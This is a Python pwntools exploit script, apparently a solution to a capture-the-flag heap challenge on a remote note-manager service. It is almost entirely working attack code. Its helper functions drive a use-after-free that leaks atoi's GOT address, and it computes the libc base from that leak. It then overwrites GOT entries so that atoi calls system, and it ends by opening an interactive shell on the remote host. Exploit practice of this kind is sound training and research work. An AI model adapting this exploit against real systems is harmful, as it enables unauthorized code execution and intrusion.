from pwn import *
from time import sleep
context.arch = 'amd64'

r = remote('csie.ctf.tw',10139)
#r = remote('localhost',8888)



def add_note(size,content):
    r.recvuntil(':')
    r.send('1')
    r.recvuntil(':')
    r.send(str(size))
    r.recvuntil(':')
    r.send(content)
def del_note(idx):
    r.recvuntil(':')
    r.send('2')
    r.recvuntil(':')
    r.sendline(str(idx))
def print_note(idx):
    r.recvuntil(':')
    r.send('3')
    r.recvuntil(':')
    r.sendline(str(idx))

size = 0xa0
content = 'faceb00c'
magic = 0x400c23
print_note_content_addr = 0x400886
atoi_got = 0x602068
atoi_off = 0x36e80

#
'''
0x000000000012de04 : mov rdi, rbp ; call rdx
0x000000000013a940 : mov rdi, rsp ; call rdx
'''

#first two
add_note(0xb0,'a'*16)#0
add_note(0xb0,'b'*16)#1
del_note(0)
del_note(1)
add_note(0x10,flat([print_note_content_addr,atoi_got]))#3
print_note(0)

#get libc
libc = u64( r.recvline().strip().ljust(8,'\0') ) - atoi_off
print 'glibc : ' , hex(libc)
#ret2text
sys_addr = libc + 0x45390
add_note_318 = 0x4009e3
del_note(2)
#overwrite got start from stack_chk_fail,but only change the atoi and stack_chk_fail
#just jump to main+93 at __stack_chk_fail
#then read '/bin//sh' to buf and send it to atoi
'''
0x601ff8 R_X86_64_GLOB_DAT  __gmon_start__
0x6020a0 R_X86_64_COPY     stdout@@GLIBC_2.2.5
0x6020b0 R_X86_64_COPY     stdin@@GLIBC_2.2.5
0x602018 R_X86_64_JUMP_SLOT  free@GLIBC_2.2.5
0x602020 R_X86_64_JUMP_SLOT  _exit@GLIBC_2.2.5
0x602028 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5
0x602030 R_X86_64_JUMP_SLOT  __stack_chk_fail@GLIBC_2.4
0x602038 R_X86_64_JUMP_SLOT  printf@GLIBC_2.2.5
0x602040 R_X86_64_JUMP_SLOT  read@GLIBC_2.2.5
0x602048 R_X86_64_JUMP_SLOT  __libc_start_main@GLIBC_2.2.5
0x602050 R_X86_64_JUMP_SLOT  fgets@GLIBC_2.2.5
0x602058 R_X86_64_JUMP_SLOT  malloc@GLIBC_2.2.5
0x602060 R_X86_64_JUMP_SLOT  setvbuf@GLIBC_2.2.5
0x602068 R_X86_64_JUMP_SLOT  atoi@GLIBC_2.2.5
0x602070 R_X86_64_JUMP_SLOT  exit@GLIBC_2.2.5
'''
stack_check_got = 0x602030 
add_note(0x10,flat([add_note_318,stack_check_got]))#3
print_note(0)


#got replacement payload 
ret = 0x400a3f
got_pay = flat( [0x400c96,0xdeadbeef,libc + 0xf7220,0xdeadbeef,0xdeadbeef,0xdeadbeef,0xdeadbeef,sys_addr,0xdeadbeef] )

r.send(got_pay)
r.interactive()

